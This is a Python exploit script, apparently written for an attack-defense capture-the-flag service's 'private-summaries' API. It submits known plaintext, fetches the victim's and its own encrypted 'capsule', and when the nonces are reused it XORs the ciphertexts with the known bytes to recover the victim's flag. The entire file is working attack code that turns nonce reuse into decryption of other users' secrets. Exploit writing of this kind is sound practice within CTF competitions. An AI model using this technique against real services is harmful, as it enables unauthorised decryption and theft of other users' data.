#!/usr/bin/env python3
import base64
import secrets

import requests

from common import FLAG, TIMEOUT, account, classify, create_summary, report, target


def capsule(service, session, identifier):
    response = session.get(
        service + "/vodokanal/hs/api/v1/private-summaries/" + identifier + "/capsule",
        timeout=TIMEOUT,
    )
    if response.status_code != 200:
        raise RuntimeError("capsule HTTP {}".format(response.status_code))
    return response.json()


def exploit(service, session, identifier, preview):
    known = b"X" * 32
    own_id = create_summary(
        session, service, "Cipher-" + secrets.token_hex(12), known.decode("ascii"), "Sealed", preview["batchId"]
    )
    victim = capsule(service, session, identifier)
    own = capsule(service, session, own_id)
    victim_nonce = base64.b64decode(victim["nonce"], validate=True)
    own_nonce = base64.b64decode(own["nonce"], validate=True)
    if len(victim_nonce) != 12 or victim_nonce != own_nonce:
        return
    victim_bytes = base64.b64decode(victim["ciphertext"], validate=True)
    own_bytes = base64.b64decode(own["ciphertext"], validate=True)
    if min(len(victim_bytes), len(own_bytes)) < 48:
        return
    plaintext = bytes(a ^ b ^ c for a, b, c in zip(victim_bytes[:32], own_bytes[:32], known))
    try:
        flag = plaintext.decode("ascii")
    except UnicodeDecodeError:
        return
    if FLAG.fullmatch(flag):
        print(flag, flush=True)


def main():
    try:
        service, identifiers = target()
        if not identifiers:
            return
        session, _, _ = account(service)
        summaries, _ = classify(session, service, identifiers)
    except (KeyError, ValueError, RuntimeError, requests.RequestException) as error:
        report("setup", error)
        return
    for identifier, preview in summaries:
        try:
            exploit(service, session, identifier, preview)
        except (KeyError, ValueError, RuntimeError, requests.RequestException) as error:
            report(identifier, error)


if __name__ == "__main__":
    main()
